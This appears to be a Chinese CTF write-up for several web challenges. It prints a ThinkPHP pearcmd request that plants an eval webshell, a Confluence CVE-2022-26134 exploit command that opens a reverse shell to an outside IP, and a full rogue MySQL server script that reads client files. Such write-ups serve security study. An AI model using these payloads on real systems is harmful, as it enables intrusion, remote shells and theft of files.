Be-a-Language-Expert

题目描述

Web,difficulty:Baby I heard that there was a vulnerability in ThinkPHP recently, but luckily I set the permissions low and ran it in a docker container, so no one can RCE me.

http://47.98.124.175:8080

题目内容

题目分析

这题从群里大佬哪里拿到相关链接：

ThinkPHP多语言模块文件包含RCE复现详细教程

Thinkphp 多语言 RCE

解题步骤

在 /tmp/ 下生成 hello.php

直接利用p牛文章中的请求包，需要根据实际情况改变文件名称，写不进去可以考虑多加点../

GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=@eval($_REQUEST['1']);?>+/tmp/2.php HTTP/1.1
Host: 47.98.124.175:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: think_lang=zh-cn
Connection: close

包含 2.php，并用蚁剑连接

最后在根目录下运行 ./readflag 获取 flag。（速度要快，服务器好像会定时删除 tmp 目录下的所有文件，尝试写文件的结果一直不行）

Be-a-Wiki-Hacker

题目描述

Web`,`difficulty:Normal

Your wiki is my wiki.

http://47.98.212.188:8080/

题目内容

题目分析

打开发现是基于基于 Atlassian Confluence 7.13.6 技术构建，直接搜，正好碰到CVE-2022-26134

攻击者可利用漏洞在未经身份验证的情况下，远程构造OGNL表达式进行注入，在Confluence Server或Data Center上执行任意代码。

工具：https://github.com/0x14dli/cve2022-26134exp

解题步骤

直接使用反弹shell

我用的是阿里云的服务器，反弹 shell 的时候要设置安全组允许题目的机器进来。

运行如下命令反弹 shell

nc -lvvp 12345
python3 cve2022-26134exp.py -u http://47.98.212.188:8080/ -i 47.115.222.18 -p 12345

Evil MySQL Server

题目描述

Web`,`difficulty:Normal

Please do not connect to an evil mysql server.

http://116.62.153.136:8080/

P.S. flag path: /flag

题目内容

题目分析

本题考点是 Mysql LOAD DATA 读取客户端任意文件漏洞。

解题步骤

注意要把云服务器的安全组设置一下，允许题目的机器进来！！！

不过不知道为啥火炬木的 POC 不好使，我只好拿网上的魔改了一下然后成功了。

#!/usr/bin/python
#coding: utf8
import socket
# linux :
#filestring = "/etc/passwd"
# windows:
#filestring = "C:\Windows\system32\drivers\etc\hosts"
HOST = "0.0.0.0" # open for eeeeveryone! ^_^
PORT = 3306
BUFFER_SIZE = 1024
#1 Greeting
greeting = "\x5b\x00\x00\x00\x0a\x35\x2e\x36\x2e\x32\x38\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x34\x2e\x30\x34\x2e\x31\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"
#2 Accept all authentications
authok = "\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"
#3 Payload
#数据包长度
payloadlen = "\x06\x00\x00" #这里明显有问题啦，因为文档告诉我们数据包的长度是用三个字节表示的
packetNumber = "\x01"
data = "\xfb\x2f\x66\x6c\x61\x67"
payload = payloadlen + packetNumber + data
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)
while True:
    conn, addr = s.accept()
    print 'Connection from:', addr
    conn.send(greeting)
    while True:
        data = conn.recv(BUFFER_SIZE)
        print " ".join("%02x" % ord(i) for i in data)
        conn.send(authok)
        data = conn.recv(BUFFER_SIZE)
        conn.send(payload)
        print "[*] Payload send!"
        data = conn.recv(BUFFER_SIZE)
        if not data: break
        print "Data received:", data
        break
    # Don't leave the connection open.
    conn.close()

Yummy Api

题目描述

Web`,`difficulty:Baby

What bad intentions could there be for a yummy api?

http://47.98.161.119:8080 http://47.98.161.119:9090

题目内容

题目分析

https://github.com/vulhub/vulhub/blob/master/yapi/mongodb-inj/poc.py
